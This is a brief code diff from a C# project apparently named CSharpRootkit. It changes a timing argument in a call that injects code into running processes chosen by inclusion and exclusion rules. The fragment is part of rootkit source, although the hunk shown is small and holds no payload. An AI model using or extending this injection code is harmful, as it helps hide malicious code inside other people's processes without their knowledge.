@@ -89,7 +89,7 @@ namespace CSharpRootkit
                 IntPtr procHandle = SharpInjector.GetProcessHandleWithRequiredRights(proc.Id);
                 if (!RootKitInterface.IsAgainstInclusionExclusionRules(procHandle) && Utils.ShouldInject(procHandle))
                 {
-                    SharpInjector.Inject(procHandle, InjectionEntryPoint, 0);
+                    SharpInjector.Inject(procHandle, InjectionEntryPoint, 3000);
                     injectedPids.Add(proc.Id);
                 }
 
